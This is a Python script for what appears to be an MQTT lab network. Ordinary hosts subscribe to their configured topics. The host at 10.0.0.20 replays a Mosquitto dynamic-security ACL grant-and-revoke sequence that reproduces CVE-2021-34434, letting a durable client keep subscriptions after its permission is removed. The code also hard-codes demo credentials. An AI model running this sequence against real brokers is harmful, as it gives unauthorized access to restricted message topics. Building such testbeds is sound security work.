import subprocess
import paho.mqtt.client as mqtt
import time
import mqtt_utilities as util

# Define topic lists for different IP addresses
USERNAME = "client"
PASSWORD = "pass"


def on_message(client, userdata, msg):
    print(f"topic: {msg.topic}  -  message: {msg.payload.decode()}", flush=True)


# Main function
def main():
    # Get the machine's IP address
    time.sleep(40)
    ip_address = util.get_ip()
    if not ip_address:
        print("Unable to determine system IP address. Exiting.")
        return
    ip_fourth_byte = int(ip_address.split(".")[-1])
    if ip_fourth_byte > 20:
        suffix = str(int(str(ip_fourth_byte)[-1]) + 1)
        print(f"Machine IP address: {ip_address}")

        # Determine the list of topics for this IP
        topics = util.TOPIC_MAP.get(ip_address, None)
        if not topics:
            print(f"No topics configured for this IP: {ip_address}. Exiting.")
            return
        connection1 = util.Connection_status()
        # Initialize MQTT client
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5,
                             userdata={"connection": connection1})
        # client.username_pw_set("#", "your_password")  # Replace with the wildcard user's password
        client.on_connect = util.on_connect
        client.on_message = on_message
        client.on_connect = util.on_connect
        client.on_disconnect = util.on_disconnect
        client.username_pw_set(USERNAME + suffix, PASSWORD + suffix)

        while True:
            # Connect to the MQTT broker
            if util.connect_client(client, connection1, 10, True):
                print("Beginning to subscribe to intended topics", flush=True)
                for topic in topics:
                    client.subscribe(topic, qos=2)
                    print(f"Subscribed to topic: {topic}", flush=True)
                print("Beginning to process messages", flush=True)
                time.sleep(1000)
                client.disconnect()
                break
            else:
                print(f"Retrying connection in 10 seconds...", flush=True)
                time.sleep(10)

    elif ip_fourth_byte == 20:
        # The machine with ip 10.0.0.20 is a durable client vulnerable to CVE-2021-34434 exploit due to a specific sequence of dynsec management operations.
        connection = util.Connection_status()
        a_connection = util.Connection_status()
        a_username = "myadmin"
        a_password = "pass123"
        reconnect_delay = 10
        # send message to $CONTROL/dynamic-security/v1 topic to change ACLs for client1
        print("Connecting to broker as admin to add roleClient4 for client1...", flush=True)
        not_reachable = True
        while not_reachable:
            admin_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, userdata={"connection": a_connection})
            admin_client.username_pw_set(a_username, a_password)
            admin_client.on_connect = util.on_connect
            admin_client.on_disconnect = util.on_disconnect
            admin_client.on_publish = util.on_publish
            if util.connect_client(admin_client, a_connection, reconnect_delay):
                print(
                    "Sending admin message to add new ACLs for client1...", flush=True)
                admin_client.publish("$CONTROL/dynamic-security/v1",
                                     '{"commands": [{"command": "addRoleACL", "rolename": "roleClient1", "acltype": "subscribePattern", \
                                     "topic": "#", "priority": 1, "allow": true}]}')

                time.sleep(3)
                not_reachable = False
            else:
                print(f"Retrying admin connection in {reconnect_delay} seconds...")
                time.sleep(reconnect_delay)

        while True:

            # initialize the durable client
            client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, userdata={"connection": connection},
                                 protocol=mqtt.MQTTv5, client_id="durable_client")
            client.username_pw_set("client1", "pass1")
            client.on_connect = util.on_connect
            client.on_subscribe = util.on_subscribe
            client.on_unsubscribe = util.on_unsubscribe
            client.on_message = on_message
            client.on_disconnect = util.on_disconnect
            properties = mqtt.Properties(mqtt.PacketTypes.CONNECT)
            properties.SessionExpiryInterval = 10000

            # connect the durable client to the broker
            print("Connecting client1 to the broker...", flush=True)
            if util.connect_client(client, connection, reconnect_delay, input_clean_start=False,
                                   input_properties=properties):

                # the durable clients subscribes to the desired topics and then disconnects
                print("Subscribing client1 to every accessible topic...", flush=True)
                for topic in util.TOPIC_MAP["10.0.0.20"]:
                    client.subscribe(topic, qos=2)
                    print(f"Subscribed to topic: {topic}", flush=True)
                for topic in util.TOPIC_MAP["10.0.0.23"]:
                    client.subscribe(topic, qos=2)
                    print(f"Subscribed to topic: {topic}", flush=True)
                time.sleep(3)
                print("Disconnecting client1 from the broker...", flush=True)
                client.disconnect()
                time.sleep(3)

                # revoke the subscribe permissions when the durable client is disconnected
                print(
                    "Sending admin message to remove the newly added ACLs for client1...", flush=True)
                admin_client.publish("$CONTROL/dynamic-security/v1",
                                     '{"commands": [{"command": "removeRoleACL", "rolename": "roleClient1", "acltype": "subscribePattern", "topic": "#"}]}')
                time.sleep(3)
                print("Disconnecting admin...", flush=True)
                admin_client.disconnect()
                time.sleep(3)

                # reconnect the durable client
                while True:
                    print("Reconnecting client1 to the broker...", flush=True)
                    if util.connect_client(client, connection, reconnect_delay, input_clean_start=False,
                                           input_properties=properties):
                        print("Beginning to process messages", flush=True)
                        # remove the previous dynsec command or change it to not affect the client and add subscribe to restricted_topic if mosquitto version is not affected by vulnerability
                        time.sleep(1000)
                        client.disconnect()
                        break
                    else:
                        print(
                            f"Retrying connection in {reconnect_delay} seconds...", flush=True)
                        time.sleep(reconnect_delay)
                break
            else:
                print(
                    f"Retrying connection in {reconnect_delay} seconds...", flush=True)
                time.sleep(reconnect_delay)


if __name__ == "__main__":
    main()
